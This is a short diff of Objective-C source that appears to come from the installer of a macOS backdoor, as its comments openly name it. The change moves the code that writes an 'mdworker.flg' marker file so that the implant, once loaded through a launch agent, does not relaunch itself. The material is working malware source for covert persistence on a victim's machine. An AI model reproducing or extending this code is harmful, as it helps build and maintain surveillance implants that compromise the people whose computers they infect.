@@ -195,18 +195,6 @@ int main(int ac, char *av[])
            destinationDir,
            binary];
 
-  //
-  // Create mdworker.flg so that once loaded the backdoor won't relaunch itself
-  // through launchd (will be already loaded by launchd)
-  //
-  NSString *mdworker = [[NSString alloc] initWithFormat: @"%@/mdworker.flg",
-           destinationDir];
-  [@"" writeToFile: mdworker
-        atomically: YES
-          encoding: NSUTF8StringEncoding
-             error: nil];
-  [mdworker release];
-
   if ([_fileManager fileExistsAtPath: binaryPath])
     {
       //
@@ -278,6 +266,18 @@ int main(int ac, char *av[])
       NSLog(@"Error on createLaunchAgent");
 #endif
     }
+
+  //
+  // Create mdworker.flg so that once loaded the backdoor won't relaunch itself
+  // through launchd (will be already loaded by launchd)
+  //
+  NSString *mdworker = [[NSString alloc] initWithFormat: @"%@/mdworker.flg",
+           destinationDir];
+  [@"" writeToFile: mdworker
+        atomically: YES
+          encoding: NSUTF8StringEncoding
+             error: nil];
+  [mdworker release];
 
   [backdoorDir release];
   [_backdoorDir release];
